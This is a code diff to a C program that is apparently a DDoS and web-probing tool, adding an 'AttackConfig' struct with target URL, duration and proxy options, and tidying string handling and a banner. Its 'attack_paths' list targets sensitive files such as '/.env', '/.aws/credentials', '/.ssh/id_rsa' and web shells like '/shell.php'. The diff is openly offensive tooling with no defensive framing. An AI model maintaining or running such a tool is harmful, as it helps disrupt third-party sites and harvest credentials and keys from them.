@@ -54,6 +54,14 @@ typedef struct {
     pthread_mutex_t mutex;
 } AtomicCounter;
 
+typedef struct {
+    char target_url[1024];
+    char target_host[256];
+    int duration_sec;
+    bool use_proxy;
+    ConnectionPool *pool;
+} AttackConfig;
+
 ProxyList proxy_list = {0};
 AtomicCounter stats = {0, PTHREAD_MUTEX_INITIALIZER};
 AtomicCounter bytes_sent = {0, PTHREAD_MUTEX_INITIALIZER};
@@ -171,7 +179,7 @@ char* generate_custom_path() {
     
     const char *attack_paths[] = {
         "/wp-admin/admin-ajax.php", "/cgi-bin/", "/phpmyadmin/", "/mysql/",
-        "/backup/", "/config/", "/", "/database/", "/dump/", "/logs/",
+        "/backup/", "/config/", "/database/", "/dump/", "/logs/",
         "/.git/", "/.env", "/.aws/credentials", "/.ssh/id_rsa",
         "/api/v1/admin", "/api/v2/debug", "/api/v3/internal", "/graphql",
         "/vulnerabilities/", "/shell.php", "/cmd.php", "/eval.php",
@@ -429,7 +437,7 @@ void print_banner() {
     printf(COLOR_RED);
     printf("\n");
     printf("    ╔══════════════════════════════════════════════════════════════════════════╗\n");
-	printf("    ║                                                                          ║\n");
+    printf("    ║                                                                          ║\n");
     printf("    ║ ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███████╗ ║\n");
     printf("    ║██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝ ║\n");
     printf("    ║██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ██║  ██║██║  ██║██║   ██║███████╗ ║\n");
@@ -461,6 +469,7 @@ int main(int argc, char *argv[]) {
     
     AttackConfig cfg = {0};
     strncpy(cfg.target_url, argv[1], 1023);
+    cfg.target_url[1023] = '\0';
     cfg.duration_sec = atoi(argv[2]);
     cfg.use_proxy = (argc >= 4 && strcmp(argv[3], "proxy") == 0);
     
@@ -475,6 +484,7 @@ int main(int argc, char *argv[]) {
         cfg.target_host[host_len] = '\0';
     } else {
         strncpy(cfg.target_host, host_start, 255);
+        cfg.target_host[255] = '\0';
     }
     free(url_copy);
     
